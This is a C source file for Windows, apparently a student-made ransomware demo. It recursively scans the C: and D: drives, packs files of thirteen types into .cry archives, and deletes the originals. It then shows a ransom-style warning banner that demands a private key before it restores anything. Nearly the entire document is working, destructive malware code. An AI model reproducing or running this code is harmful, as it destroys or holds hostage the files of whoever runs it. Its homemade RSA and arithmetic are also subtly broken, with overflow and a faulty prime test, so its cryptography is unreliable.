#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <Windows.h>
#include <math.h>
#include <time.h>
void makekey(int* key);//生成公钥和私钥
bool isprime(int n);//判断是否为质数
int extended_gcd(int a,int b,int* x,int* y);//利用辗转相除法的逆递推来解出私钥d
void findfile(char* path,char** sort,FILE** fp,int* key);//查找文件并打包加密
bool checkfile(char* filename,char* sort);//检查文件类型
char* getfileext(char* filename);//获取文件拓展名
void pack(char* filename,FILE** fp,int* key);//打包文件并加密
void RSA(long long* m,int *key);//非对称加密文件
int modpow(long long a, long long b, int c);//快速幂,实现从明文到密文的运算
void unpack(char* sort,int* key,int privatekey);//解包并解密文件
void unlock(long long *m,int* key,int privatekey);//解密文件
struct filehead  //用于储存要打包的文件的信息的结构体,称为文件头,储存文件路径文件名和文件大小,加密文件通过加密文件头中的文件大小来实现
{
    long long filesize;
    char filename[1024];
};
int main()
{
    int key[3]={0};//生成并储存公钥私钥
    makekey(key);
    char* sort[13]={"txt","jpg","pdf","exe","pptx","docx","c","cpp","zip","rar","png","py","xlsx"};
    FILE* fp_txt=fopen("txt.cry","wb");//创建txt打包文件
    if(fp_txt==NULL) 
    {
        printf("create pack file failed\n");
        return -1;
    }
    FILE* fp_jpg=fopen("jpg.cry","wb");//创建jpg打包文件
    if(fp_jpg==NULL) 
    {
        printf("create pack file failed\n");
        return -1;
    }
    FILE* fp_pdf=fopen("pdf.cry","wb");//创建pdf打包文件
    if(fp_pdf==NULL) 
    {
        printf("create pack file failed\n");
        return -1;
    }
    FILE* fp_exe=fopen("exe.cry","wb");//创建exe打包文件
    if(fp_exe==NULL) 
    {
        printf("create pack file failed\n");
        return -1;
    }
    FILE* fp_pptx=fopen("pptx.cry","wb");//创建pptx打包文件
    if(fp_pptx==NULL) 
    {
        printf("create pack file failed\n");
        return -1;
    }
    FILE* fp_docx=fopen("docx.cry","wb");//创建docx打包文件
    if(fp_docx==NULL) 
    {
        printf("create pack file failed\n");
        return -1;
    }
    FILE* fp_c=fopen("c.cry","wb");//创建c打包文件
    if(fp_c==NULL) 
    {
        printf("create pack file failed\n");
        return -1;
    }
    FILE* fp_cpp=fopen("cpp.cry","wb");//创建cpp打包文件
    if(fp_cpp==NULL) 
    {
        printf("create pack file failed\n");
        return -1;
    }
    FILE* fp_zip=fopen("zip.cry","wb");//创建zip打包文件
    if(fp_zip==NULL) 
    {
        printf("create pack file failed\n");
        return -1;
    }
    FILE* fp_rar=fopen("rar.cry","wb");//创建rar打包文件
    if(fp_rar==NULL) 
    {
        printf("create pack file failed\n");
        return -1;
    }
    FILE* fp_png=fopen("png.cry","wb");//创建png打包文件
    if(fp_png==NULL) 
    {
        printf("create pack file failed\n");
        return -1;
    }
    FILE* fp_py=fopen("py.cry","wb");//创建py打包文件
    if(fp_py==NULL) 
    {
        printf("create pack file failed\n");
        return -1;
    }
    FILE* fp_xlsx=fopen("xlsx.cry","wb");//创建xlsx打包文件
    if(fp_xlsx==NULL) 
    {
        printf("create pack file failed\n");
        return -1;
    }
    FILE* fp[13]={fp_txt,fp_jpg,fp_pdf,fp_exe,fp_pptx,fp_docx,fp_c,fp_cpp,fp_zip,fp_rar,fp_png,fp_py,fp_xlsx};
    findfile("C:\\",sort,fp,key);//查找磁盘中的指定类型文件并打包、加密
    findfile("D:\\",sort,fp,key);
    for(int i=0;i<13;i++)
    {
        fclose(fp[i]);//加密完成，关闭打包文件
    }
    printf("\033[1;31m\n");
    printf("                          |*|                          \n");
    printf("                       |*||*||*|                       \n");
    printf("                     |*|        |*|                    \n");
    printf("                   |*|    |*|     |*|                  \n");
    printf("                 |*|      |*|       |*|                \n");
    printf("                |*|       |*|        |*|               \n");
    printf("              |*|         |*|          |*|             \n");
    printf("            |*|           |*|            |*|           \n");
    printf("          |*|             |*|              |*|         \n");
    printf("         |*|              |*|               |*|        \n");
    printf("       |*|                |*|                 |*|      \n");
    printf("     |*|                                        |*|    \n");
    printf("   |*|                    |*|                     |*|  \n");
    printf(" |*|                      |*|                       |*|\n");
    printf("|*|                                                   |*|\n");
    printf("|*||*||*||*||*||*||*||*||*||*||*||*||*||*||*||*||*||*||*|\n");
    printf("\n");
    printf("\n");
    printf("sorry to tell you that all import files in your computer are encrypted by RSA!!!just try to guess the key(?).\n");
    printf("do not close the page unless you want to lose your files forever!\n");
    printf("\n");
    printf("\n");
    printf("                          |*|                          \n");
    printf("                       |*||*||*|                       \n");
    printf("                     |*|        |*|                    \n");
    printf("                   |*|    |*|     |*|                  \n");
    printf("                 |*|      |*|       |*|                \n");
    printf("                |*|       |*|        |*|               \n");
    printf("              |*|         |*|          |*|             \n");
    printf("            |*|           |*|            |*|           \n");
    printf("          |*|             |*|              |*|         \n");
    printf("         |*|              |*|               |*|        \n");
    printf("       |*|                |*|                 |*|      \n");
    printf("     |*|                                        |*|    \n");
    printf("   |*|                    |*|                     |*|  \n");
    printf(" |*|                      |*|                       |*|\n");
    printf("|*|                                                   |*|\n");
    printf("|*||*||*||*||*||*||*||*||*||*||*||*||*||*||*||*||*||*||*|\n");
    printf("\n");
    printf("\n");
    printf("sorry to tell you that all import files in your computer are encrypted by RSA!!!just try to guess the key(?).\n");
    printf("do not close the page unless you want to lose your files forever!\n");
    printf("\n");
    printf("\n");
    printf("                          |*|                          \n");
    printf("                       |*||*||*|                       \n");
    printf("                     |*|        |*|                    \n");
    printf("                   |*|    |*|     |*|                  \n");
    printf("                 |*|      |*|       |*|                \n");
    printf("                |*|       |*|        |*|               \n");
    printf("              |*|         |*|          |*|             \n");
    printf("            |*|           |*|            |*|           \n");
    printf("          |*|             |*|              |*|         \n");
    printf("         |*|              |*|               |*|        \n");
    printf("       |*|                |*|                 |*|      \n");
    printf("     |*|                                        |*|    \n");
    printf("   |*|                    |*|                     |*|  \n");
    printf(" |*|                      |*|                       |*|\n");
    printf("|*|                                                   |*|\n");
    printf("|*||*||*||*||*||*||*||*||*||*||*||*||*||*||*||*||*||*||*|\n");
    printf("\n");
    printf("\n");
    printf("sorry to tell you that all import files in your computer are encrypted by RSA!!!just try to guess the key(?).\n");
    printf("do not close the page unless you want to lose your files forever!\n");
    printf("\033[0m\n");
    //printf("%d\n",key[1]);//直接输出私钥，测试用
    printf("input the private key->");
    int privatekey=0;
    scanf("%d",&privatekey);
    while(privatekey!=key[1])
    {
        printf("the key you input is not right!!!\n");
        printf("input the private key->");
        scanf("%d",&privatekey);
    }
    for(int i=0;i<13;i++)
    {
        unpack(sort[i],key,privatekey);//解包并解密指定类型的文件
    }
    printf("\033[1;31m\n");
    printf("Congratulations!!!\n");
    printf("Congratulations!!!\n");
    printf("Congratulations!!!\n");
    printf("Congratulations!!!\n");
    printf("Congratulations!!!\n");
    printf("\033[0m\n");
    printf("all the files in your computer are already unencrypted now!\n");
    printf("all the files in your computer are already unencrypted now!\n");
    printf("all the files in your computer are already unencrypted now!\n");
    system("pause");
    return 0;
}
void makekey(int* key)//生成公钥和私钥
{
    srand(time(NULL));
    int p=rand()%12768+20000;
    while(!isprime(p))
    {
        p=rand()%12768+20000;
    }
    int q=rand()%12768+20000;
    while(!isprime(q) || q==p)
    {
        q=rand()%12768+20000;
    }
    int N=p*q;//生成公私钥中的N
    int T=(p-1)*(q-1);
    int e=0;
    for(int i=3;i<T;i++)
    {
        if(isprime(i) && T%i!=0)
        {
            e=i;//生成公钥对中的e
            break;
        }
    }
    int d=0;
    int x, y;
    if(extended_gcd(e,T,&x,&y)==1)//求解私钥d
    {
        d=(x%T+T)%T;  //调整到合适范围
    } else {
        makekey(key);//求解失败则重新生成
        return;
    }
    key[0]=e;
    key[1]=d;
    key[2]=N;
    return;
}
bool isprime(int n)//判断是否是素数
{
    if(n%2==0) return FALSE;
    if(sqrt(n)-(int)sqrt(n)<1e-6) return FALSE;
    for (int i=2;i<(int)sqrt(n);i++)
	{
		if (n%i==0) return FALSE;
	}
    return TRUE;
}
int extended_gcd(int a,int b,int* x,int* y)//利用辗转相除法的逆递推来解出私钥d
{
    if (b==0)
    {
        *x=1;
        *y=0;
        return a;
    }
    int x1,y1;
    int gcd=extended_gcd(b,a%b,&x1,&y1);
    *x=y1;
    *y=x1-(a/b)*y1;
    return gcd;
}
void findfile(char* path,char** sort,FILE** fp,int* key)
{
    char find[1024]={'\0'};//储存要查找的路径，以查找全部文件及文件夹
    char temp[1024]={'\0'};//储存找到的文件或者文件夹的路径和名字
    sprintf(find,"%s\\*.*",path);
    WIN32_FIND_DATA filedata;//用于储存查找到的文件信息
    HANDLE hfile=FindFirstFile(find,&filedata);//查找第一个文件或文件夹
    if(INVALID_HANDLE_VALUE==hfile)
    {
        printf("no file\n");
        return;//找不到第一个,说明目录下没有文件或查找失败,直接返回
    }
    int ret=1;
    while(ret)
    {
        if(filedata.cFileName[0]=='.')//排除.和..
        {
            ret=FindNextFile(hfile,&filedata);
            continue;
        }
        sprintf(temp,"%s\\%s",path,filedata.cFileName);
        if(filedata.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)//是文件夹
        {
            findfile(temp,sort,fp,key);//继续递归查找
        }else{                                                //是文件
            for(int i=0;i<13;i++)
            {
                if(checkfile(temp,sort[i])) //检查是否是指定类型文件
                {
                    printf("%s file: %s  being encrypted...\n",sort,filedata.cFileName);
                    pack(temp,&fp[i],key);//打包并加密文件
                    remove(temp);//删除原文件
                    printf("Done\n");
                    break;
                }         
            }
        }
        ret=FindNextFile(hfile,&filedata);
    }
}
bool checkfile(char* filename,char* sort)//判断文件类型
{
    char* ext=getfileext(filename);
    if(ext==NULL) return FALSE;
    if(strcmp(sort,ext)==0) return TRUE;
    else return FALSE;
}
char* getfileext(char* filename)//获取文件拓展名
{
    char* dot=strrchr(filename,'.');//获取最后一个“.”的位置
    if(dot==NULL || dot==filename) return NULL;
    return dot+1;//返回拓展名的指针
}
void pack(char* filename,FILE** fp,int* key)//打包文件并加密文件头的文件大小
{
    FILE* tfp=fopen(filename,"rb");//打开要打包的文件
    if(tfp==NULL) 
    {
        printf("open file failed");
        return;
    }
    fseek(tfp,0,SEEK_END);//计算文件大小
    long long filesize=ftell(tfp);
    fseek(tfp,0,SEEK_SET);
    struct filehead fhd={0};//创建一个文件头,储存文件名和文件大小
    fhd.filesize=filesize;
    RSA(&fhd.filesize,key);//加密文件大小信息
    strcpy(fhd.filename,filename);
    fwrite(&fhd,1,sizeof(fhd),*fp);//写入文件头
    char buffer[4096]={0};
    while(1)
    {
        int ret=fread(buffer,1,4096,tfp);
        if(ret<=0) break;
        fwrite(buffer,1,ret,*fp);
    }//写入文件
    fclose(tfp);
}
void RSA(long long* m,int* key)//非对称加密
{
    *m=modpow(*m,key[0],key[2]);//使用公钥进行加密
}
int modpow(long long a, long long b, int c) //计算a^b%c,利用二进制位运算防止溢出
{
    int result=1;
    while(b>0) 
    {
        if(b&1) 
        {
            result=(result*a)%c;
        }
        b=b>>1;
        a=(a*a)%c;
    }
    return result;
}
void unpack(char* sort,int* key,int privatekey)//解包并解密指定类型文件
{
    struct filehead fhd={0};
    char packname[256]={'\0'};
    sprintf(packname,"%s%s",sort,".cry");
    FILE* fp=fopen(packname,"rb");//打开打包的文件
    if(fp==NULL)
    {
        printf("fail to open packed file\n");
        return;
    }
    while(1)
    {
        int ret=fread(&fhd,1,sizeof(fhd),fp);//读取文件头
        if(ret<=0) break;//说明所有数据读取完毕，退出循环
        unlock(&fhd.filesize,key,privatekey);//解密文件大小
        FILE* tfp=fopen(fhd.filename,"wb");//创建解包出的文件
        if(tfp==NULL)
        {
            fseek(fp,fhd.filesize,SEEK_CUR);
            continue;
        }
        int leftsize=fhd.filesize;//储存剩余的没读取的文件数据
        char buffer[4096]={0};//创建缓冲区
        while(leftsize>0)
        {
            ret=fread(buffer,1,leftsize<4096?leftsize:4096,fp);
            leftsize-=ret;
            fwrite(buffer,1,ret,tfp);
        }
        fclose(tfp);
    }
    fclose(fp);
    remove(packname);//解包完成,删除打包文件
}
void unlock(long long *m,int* key,int privatekey)//解密
{
    *m=modpow(*m,privatekey,key[2]);//使用私钥进行解密
}


                        